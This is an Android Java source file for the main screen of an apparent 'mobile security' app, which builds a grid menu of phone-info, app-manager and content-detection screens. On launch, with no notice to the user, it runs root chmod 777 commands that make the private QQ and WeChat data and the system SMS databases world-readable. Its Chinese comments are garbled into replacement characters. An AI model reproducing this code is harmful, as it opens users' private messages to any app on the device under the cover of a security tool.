package com.mobile.security.ui;

import java.io.DataOutputStream;
import java.io.IOException;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.AdapterView;
import android.widget.GridView;
import android.widget.AdapterView.OnItemClickListener;

import com.mobile.security.R;
import com.mobile.security.adapter.MainUIAdapter;
import com.mobile.security.engine.SystemManager;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		
		String apkRoot="chmod 777 "+getPackageCodePath();
        SystemManager.RootCommand(apkRoot);
        SystemManager.runRootCommand("chmod -R 777 /data/data/com.tencent.mobileqq/databases/");
        SystemManager.runRootCommand("chmod -R 777 /data/data/com.tencent.mm/");
        SystemManager.runRootCommand("chmod 777 /data/data/com.android.providers.telephony/databases/mmssms.db");
        SystemManager.runRootCommand("chmod 777 /data/data/com.android.providers.telephony/databases/mmssms.db-wal");
        SystemManager.runRootCommand("chmod 777 /data/data/com.android.providers.telephony/databases/mmssms.db-shm");

		GridView gridView = (GridView) findViewById(R.id.gv_main);
		MainUIAdapter adapter = new MainUIAdapter(this);
		gridView.setAdapter(adapter);

		gridView.setOnItemClickListener(new OnItemClickListener() {
			public void onItemClick(AdapterView<?> parent, View view,
					int position, long id) {
				switch (position) {
				case 0: // �ֻ���Ϣ
					Intent phoneinfoIntent = new Intent(MainActivity.this,
							MobileInfoActivity.class);
					startActivity(phoneinfoIntent);
					break;

				case 1: // �������
					Intent appmangerIntent = new Intent(MainActivity.this,
							AppManagerActivity.class);
					startActivity(appmangerIntent);
					break;

				case 2: // ͼƬ�����ּ��
					Intent wordPicIntent = new Intent(MainActivity.this,
							WordinPicActivity.class);
					startActivity(wordPicIntent);
					break;

				case 3: // �ı���Ϣ���
					Intent detectionIntent = new Intent(MainActivity.this,
							ContentDetectionActivity.class);
					startActivity(detectionIntent);
					break;

				case 4: // �汾����
					Intent cuIntent = new Intent(MainActivity.this,
							CheckUpdateActivity.class);
					startActivity(cuIntent);
					break;

				case 5: // �ֻ�ɱ��
					break;

				case 6: // ϵͳ�Ż�
					break;

				case 7: // �߼�����
					break;

				case 8: // ��������
					break;

				default:
					break;
				}
			}
		});

	}
}
